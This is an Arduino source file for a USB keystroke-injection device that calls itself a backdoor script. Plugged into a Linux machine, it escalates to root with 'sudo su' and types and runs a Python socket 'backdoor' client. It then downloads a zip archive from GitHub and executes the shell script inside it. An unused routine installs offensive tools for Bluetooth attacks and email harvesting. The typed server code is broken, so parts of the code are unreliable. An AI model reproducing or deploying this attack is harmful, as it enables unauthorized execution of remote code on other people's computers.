//Ruber ducky backdoor scirpt
#include <Keyboard.h> //This is going to allow us to work with the virtual keyboard for arduino 
// https://adafruit.github.io/arduino-board-index/package_adafruit_index.json

//////////////////////////////////////// SPECIAL KEYS 
//This is going to allow us to enter in backspace keys on the virtual keyboard 
void backspace()
{   
    Keyboard.press(KEY_BACKSPACE);
    Keyboard.releaseAll();
    delay(100);

    return;
}

//This function is going to hit the tab key on the virtual keyboard
void tab()
{   
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
    delay(100);
    return;
}


//This function is going to serve for hitting the enter virtual key on the keyboard
void enter()
{   
    Keyboard.press(KEY_RETURN); 
    Keyboard.releaseAll();
    delay(100);

}




//////////////////////////////////////// PRINT FUNCTION
//This function is going to pritn text to the main screen where the cursor is pointing in a text based eelement on the system
void cout(String printftext)
{
    
    Keyboard.print(printftext); 
    delay(100);
    return;
}


//////////////////////////////////////// BACKDOOR CLIENT NAD SERVER SDIE SETUP
///////CLIENT 
//This is going to write out the client side of the backdoor script
void client()
{
   
    //First we are going to import any and all modules we need for the python3 script 
    cout("import socket #This is going to allow us to work with the socket networking module");
    enter();
    enter();

    //Next we start declaring the main cleint ip and port address information we wish to connect to from the client side of the conneciton
    cout("ip = str('localhost') #This is going to convert the main ip address to as string since we are in the arduino language for the virtual keyboard");
    enter();
    enter();

    cout("port = 8 #This is going to define the main port address we wish to connect onto from the client side of the connection");
    enter();
    enter();

    cout("address = (ip, port) #THis is goign to nest both the ip and port arguments into one argument");
    enter();
    enter();

    //Next we are going to design the main socket for conenctivity and transpoert handling 
    cout("client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #This is going to create a TCP based socket for data communication purposes");
    enter();
    enter();

    cout("client.connect(address) #qTHis is going to connect us directly to the server side ip and port on the network, either internally or externally on the internet");
    enter();
    enter();

    //Next we are going to have the clinet side sne data to ther serve sdie and wait for a response from the server 
    cout("while True:");
    enter();
    enter();
    enter();

        tab(); //This is going to allow us to inedent correctly to avoid errors during the runtime of the python3 script 
        
        //Main code exectuion inside the while loop is going to continute executing here 
        cout("data = str('Hello World from the Client socket').encode('utf-8')");
        enter(); 
        enter(); 

        cout("client.send(data) #This is going to send the data over to the main server dside of the connetion");
        enter();
        enter();

        //Next we are going to set the client side up to receive data from the server side of the econnection, and if it does, we are going to print out the main contents from the server side of the connection taking place between clinet and server 
        cout("server_response = client.recv(7000).decode('utf-8') #This is going to allow our cline tside to handle and buffer in 7000 bytes of data at a time");
        enter();
        enter();

        //Next the program is going to wait for user input to hit enter, and then it will close out the client side fo th econnection once the end user does so
        cout("print(server_response)");
        enter(); 
        enter();

        //Now that the data has been sent successfulyl, we can now close out the main socket connection from the cleint side
        cout("client.close() #This is going to close out the client side of the connection from the server");
        enter();
        enter();

        //Now we simply need to break out of the while loop in ordre to end the program
        cout("break #This is going to break us out of the while loop argument and finish running the program, closing it out");

        //Now the file is going to save, close, and name itself on the end users system
        Keyboard.press(KEY_LEFT_CTRL); 
        Keyboard.press('s');
        Keyboard.releaseAll();
        cout("FutabaWebsBackDoorClient.py");
        delay(600);

        //This is going to navigate us to the main directroy of the desktop and then save the backdoor virus there
        Keyboard.press(KEY_DOWN_ARROW);
        Keyboard.releaseAll();
        Keyboard.press(KEY_DOWN_ARROW); 
        Keyboard.releaseAll();
        enter();
        enter(); 
        enter();
        enter();

        delay(1000);

        //Next the script is going to move into the directory of where the script is set to install itself andchmod it to turn it into an executable 
        OpenTerminal();

        delay(1000);

        cout("mv /home/kali/Arduino/FutabaWebsBackDoorClient.py /home/kali/Desktop"); //THis is going to move us into the desired directory and run the script on the system
        enter();
        delay(1000);

        cout("cd /home/kali/Desktop && chmod +rwx * && python3 FutabaWebsBackDoorClient.py "); //THis is going to move us into the desired directory and run the script on the system
        enter();

        delay(1000);

        cout("You've been hacked ^_^");
        delay(1000);
    
    return; 
}


///////SERVER
//This is going to write out the server side of the backdoor script
void server()
{
   
    //First we are going to import any and all modules we need for the python3 script 
    cout("import socket #This is going to allow us to work with the socket networking module");
    enter();
    enter();

    //Next we start declaring the main cleint ip and port address information we wish to connect to from the client side of the conneciton
    cout("ip = str('') #THis is going to set the server to auto bind to the eiether the local IP address, or the one assigned form the gateway router on the network");
    cout("port = 90 #This is going to define the main port address we wish to connect onto from the client side of the connection");
    cout("address = (ip, port) #THis is goign to nest both the ip and port arguments into one argument");
    enter();
    enter();

    //Next we are going to design the main socket for conenctivity and transpoert handling 
    cout("server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #This is going to create a TCP based socket for data communication purposes");
    cout("server.bind(address) #THis is going to connect us directly to the server side ip and port on the network, either internally or externally on the internet");
    cout("server.listen() #This is going to put the server into a listening state to handle any and all incommingn connections ton the TCP server");
    enter();
    enter();

    //This is going to cuase the server to wait in a loop state until it recieves a connection to the listening port
    cout("#Don't forget that the first main property that is being extracted from the connection, is the one we are going to use to send data back to the client. Any port in a listening state is unable to send data!");
    cout("connection, client_addr = server.accept() #This is going to allow the server to accept and handle in comming connections ton the TCP server");
    enter();
    enter();


    //Once it does, the Next thing we are going do is have the server side wait for data form the connected client
    cout("while True:");
    enter();
    enter();
    enter();

        tab(); //This is going to allow us to inedent correctly to avoid errors during the runtime of the python3 script 
        
        //Main code exectuion inside the while loop is going to continute executing here 
        cout("client_data = connection.recv(7000).decode('utf-8') #The server is going to be in a listening state waiting from data from an ongoing connection via the connection property from the server socket");
        enter();
        enter();

        //This is going to design the basic logic for if the server recieves any sort of data from the client side, and also if the client side should disconnect frpm the server side of the connection
        cout("if client_data: #If there is a connection recieved from the client side, we are going to print where the connection came from, and then handle the dat athat was recieved from it");
        enter();
        enter(); 

            tab();

            //The server is going to handle the incoming data, print it to the main console or log of where the server keeps any and all data, s well as the connectio of where it's taking place
            cout("logfile = open('log.txt, 'w') #We are going to create a file object on the system to log all the clients that are connecting tom the server");
            cout("logfile.write(str('Connection from Client => '), client_addr) #This is going to print out the client adddress details from where the connectionn came from");
            cout("logfile.write(str('DATA RECIEVED => '), client_data') #This is going to write the data that was sent from the client side of the connectinon in to our text file object"); 
            cout("logfile.close() #This is going to close out our file object so it can save properlly on the end user system the server is running on");
            enter();
            enter();

            //Next we are going to print the infomration from th eserver side of the connecton to the main console screen that the application window terminal wise is running on
            cout("print(client_data)");
            enter();
            enter();

            //Next we are going to send the cliend side some data in resposne to what eas just recived from it
            cout("response = str('This is the main serverside respone').encode('utf-8)"); 
            cout("server.sendall(response) #This is going to send the server side response data back to the client");
            enter();

            //Now we are going to exit coding for the main if statement arguemnt, and start filling in the else conditional that will check if the connection has been seevred from the clinet side of the connection
            enter();
            enter();
            backspace();
        
        //This is the else statement for the if statement above
        cout("else: #If there is no deat and the main pipeline to the connection is severed, then we are going to terminate the main server side socketisde of the connection");
        enter();
        enter();
        enter();

            tab();
            cout("server.close() #This is going to terminate the server side of the connection should the clinet disconnet from it, freeing up th eused socket so  it's not in a conflicting state");
            cout("break #This is going to break us out of the while loop condiitonal argument");

        //Now the file is going to save, close, and name itself on the end users system
        Keyboard.press(KEY_LEFT_CTRL); 
        Keyboard.press('s');
        Keyboard.releaseAll();
        cout("FutabaWebsBackDoorServer.py");

        //This is going to navigate us to the main directroy of the desktop and then save the backdoor virus there
        Keyboard.press(KEY_DOWN_ARROW);
        Keyboard.releaseAll();
        Keyboard.press(KEY_DOWN_ARROW); 
        Keyboard.releaseAll();
        enter();
        enter(); 



    return; 
}




//////////////////////////////////////// MOUSEPAD CALL
//This is going to enter in the mousepad keyword in the cursor space of system
void MousePad()
{ 
    delay(1000);
    Keyboard.print("mousepad");
    enter();
    delay(2000);

    return;
}



//////////////////////////////////////// FIREFOX DOWNLOADS 
//THis is going to open the firefox browser and download all the url links that we need for the telegram and vscode download
void FireFoxDownloads()
{   
    //THis is going to open a new instance of the terminal shell as non root so we can initiate the firefox command and downlaod what we need
    Keyboard.press(KEY_LEFT_CTRL); //This is going to press the control key on the virtual keyboard
    Keyboard.press(KEY_LEFT_ALT); //THis is going to press the alt key and the 't' key on the virtual keyboard
    Keyboard.press('t');
    Keyboard.releaseAll(); //This will release any and all keys currently pressed on the system
    delay(600);

    cout("firefox https://telegram.org/dl/desktop/linux https://code.visualstudio.com/docs/?dv=linux64_deb https://github.com/FutabaWebs/Test/archive/refs/heads/main.zip");
    enter();  
    delay(5000);

    //Next it's going to open a terminal session of it's own and then pivot into the download directory folder and unzip, and run our installer file 
    OpenTerminal();
    delay(1000);

    cout("cd /home/kali/Downloads && unzip Test-main.zip && cd Test-main && chmod +rwx * && ./MasterScriptFWebsVer4.sh");
    enter();

    //Next we are going to follow all the prompts
    enter();
    cout("10");
    enter();

    //Next the program is going to install the main script set of recommended tools that we need for the system

    return;
}


//////////////////////////////////////// SYSTEM UPDATER AND INSTALLER
//This is going to perform an install nad update of the system much like our main master bash shell script
void UpdateSystem()
{   
    //This is going to install all the recommended installs from option 10 of my program 
    cout("clear");
    enter();

    cout("apt-get update -y");
    enter();

    delay(5000);

    cout("clear");
    enter();

    cout("apt-get install httrack -y");
    enter();

    delay(5000);

    cout("apt-get install gobuster -y");
    enter();

    delay(5000);

    cout("apt-get install gdb-minimal -y");
    enter();

    delay(5000);

    cout("apt-get install bc -y");
    enter();

    delay(5000);

    cout("apt-get install bluetooth -y");
    enter();

    delay(5000);

    cout("apt-get install dkms");
    enter();

    delay(5000);

    cout("apt-get install bettercap -y");
    enter();

    delay(5000);

    cout("apt-get install bluesnarfer -y ");
    enter();

    delay(5000);

    cout("apt-get install btscanner -y");
    enter();

    delay(5000);

    cout("apt-get install emailharvester -y");
    enter();

    delay(5000);

    cout("apt-get install sendmail -y");
    enter();

    delay(5000);

    cout("apt --fix broken install -y");
    enter();

    delay(5000);

    cout("apt-get install default-jre -y");
    enter();

    delay(5000);

    cout("apt-get install openjdk-17-jdk -y");
    enter();

    delay(5000);

    cout("mkdir -p /dev/bluetooth/rfcomm");
    enter();

    cout("mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0");
    enter();

    cout("mknod --mode=666 /dev/rfcomm0 c 216 0 ");
    enter();

    cout("service bluetooth start");
    enter();

    delay(5000);

    cout("apt-get install tor -y");
    enter();

    delay(5000);
    
    cout("clear");
    enter();

    //Next we are going to install the vs code editor on the system 
    cout("cd /home/kali/Downloads");
    enter();

    cout("dpkg -i code*");
    enter();

    delay(5000);

    cout("clear");
    enter();

    //Next we are going to install telegram on the system
    cout("xz -df tsetup*");
    enter();

    delay(5000);
    
    cout("tar -xvf tsetup*");
    enter();

    delay(5000);
    
    cout("cd Telegram");
    enter();

    cout("chmod +rwx Telegram");
    enter();

    cout("./Telegram --register-app");
    enter();

    delay(6000);

    //Next the telegram window is going to open and we are going to close it using the ctrl-q command on the virtual keyboard
    Keyboard.press(KEY_LEFT_CTRL); //This is going to close out the main telegram window
    Keyboard.press('q');
    Keyboard.releaseAll();
    delay(100);

    cout("clear");
    enter();

    //After the command runs it's going to take us back to the main window space to continue scripting

    //Now we are going to install the better cap module as well as the moduels to nsniff out and crack aircrack traffic
    cout("cd /home/kali/Downloads");
    enter();

    cout("apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev -y");
    enter();

    delay(5000);

    cout("git clone https://github.com/bettercap/bettercap.git");
    enter();
    
    delay(5000);

    cout("cd bettercap");
    enter();

    cout("make build");
    enter();

    delay(5000);

    cout("sudo make install");
    enter();

    delay(5000);

    cout("cd ..");
    enter();

    cout("git clone https://github.com/bettercap/caplets.git");
    enter();

    delay(5000);

    cout("cd caplets");
    enter();

    cout("make install");
    enter();

    delay(5000);

    cout("clear");
    enter();

    cout("cd /home/kali/Downloads");
    enter();

    cout("git clone https://github.com/morrownr/8812au-20210629");
    enter();

    delay(5000);

    cout("cd /home/kali/Downloads/8812au-20210629");
    enter();

    cout("chmod +rwx dkms.conf dkms-make.sh edit-options.sh Kconfig 8812au.conf install-driver.sh remove-driver.sh ");
    enter();

    cout("clear");
    enter();

    cout("./remove-driver.sh");
    enter();

    Keyboard.press('n');
    Keyboard.releaseAll();
    delay(100);
    enter();

    delay(10000);

    cout("./install-driver.sh");
    enter();

    delay(20000);

    cout("clear");
    enter();

    //Next we are going to isntall all the main python3 script modules so the linux or window ssystem is ready for programming on it
    cout("python -m pip install pywin32");
    enter();

    delay(5000);

    cout("pip3 install netaddr");
    enter();

    delay(5000);

    cout("pip3 install paramiko");
    enter();

    delay(5000);

    cout("pip3 install pycrypto");
    enter();

    delay(5000);

    cout("python -m pip install cryptography");
    enter();

    delay(5000);

    cout("pip3 install gmpy");
    enter();

    delay(5000);

    cout("pip3 install rsa");
    enter();

    delay(5000);

    cout("pip3 install uiautomation");
    enter();

    delay(5000);

    cout("pip3 install selenium");
    enter();

    delay(5000);

    cout("pip3 install chromdriver_installer");
    enter();

    delay(5000);

    cout("pip3 install github3.py");
    enter();

    delay(5000);

    cout("pip3 install Flask");
    enter();

    delay(5000);

    cout("pip3 install Flask-Cors");
    enter();

    delay(5000);

    cout("pip3 install mysql-connector-python");
    enter();

    delay(5000);

    cout("pip3 install pyLoRa");
    enter();

    delay(5000);

    cout("pip3 install circuitpython-nrf24101");
    enter();

    delay(5000);

    cout("apt-get install python3-pyqt5");
    enter();

    delay(5000);

    cout("pip3 install arduino-python3 ");
    enter();

    delay(5000);

    cout("cd /home/kali/Desktop"); //THis is going to take us back to the main desktop so we can inintiate writing the backdoor code in the script
    enter();
    
    return;
}


//////////////////////////////////////// OPEN TERMINAL
void OpenTerminal()
{   
    Keyboard.press(KEY_LEFT_CTRL); //This is going to press the control key on the virtual keyboard
    Keyboard.press(KEY_LEFT_ALT); //THis is going to press the alt key and the 't' key on the virtual keyboard
    Keyboard.press('t'); //THis is going to press the alt key and the 't' key on the virtual keyboard

    //Next we are going to release the keys on the system
    Keyboard.releaseAll(); //This will release any and all keys currently pressed on the system

    delay(1000); //This is going to add in some delay so that it has time to process to the system

    //Next this is going to upgrade us into sudo privelages on the terminal window
    Keyboard.print("sudo su");
    enter(); //This will hit enter and then run the main sudo su command in the terminal space to upgrade command privelages on the system

    return;
}


//////////////////////////////////////// MAIN EXECUTION STARTS HERE ////////////////////////////////////////
//This is going to setup the mian code for the arduino script 
void setup() 
{
    Keyboard.begin();
    delay(1000);

    //This is to test ifn the program is runnig correctly on our end 
    //Keyboard.print("Hello this is working correctly");

    //First the program is going to open a terminal session
    OpenTerminal();

    //Next the program is going to execute the mousepad program in linux so we can type our source code exploit into it
    MousePad();

    //Next the program is going to runthe client side function to write, and then run the code on the system
    client();

    //After the hack is successful, the code is going to run another terminal session that is going to open the firefox browser to download a few executables we need
    FireFoxDownloads();

    //After the executables are run, we are going to update the system and install all the tools we need for linux to run our hacking toolbelt
    //UpdateSystem(); //This is another method we can use to install all our stuff on the system
    
    Keyboard.end();

}

//This can be left set to blank as it's only needed when we are having the code on the baord execute infinitely
void loop(){}
